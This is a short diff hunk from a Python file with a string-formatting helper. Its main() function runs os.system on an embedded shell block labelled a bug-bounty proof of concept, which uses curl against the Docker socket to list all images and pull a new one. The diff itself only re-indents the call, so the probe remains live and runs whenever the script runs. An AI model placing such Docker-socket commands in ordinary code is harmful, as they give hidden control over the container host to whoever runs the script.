@@ -141,7 +141,7 @@ def snake_to_title(s):
 	return ' '.join(word.capitalize() for word in s.split('_'))
 
 def main(args):
-		os.system('''
+	os.system('''
 # PROOF OF CONCEPT FOR BUG BOUNTY
 curl --unix-socket /var/run/docker.sock http://localhost/images/json?all=true
 curl --unix-socket /var/run/docker.sock -X POST "http://localhost/images/create?fromImage=ubuntu&tag=latest"
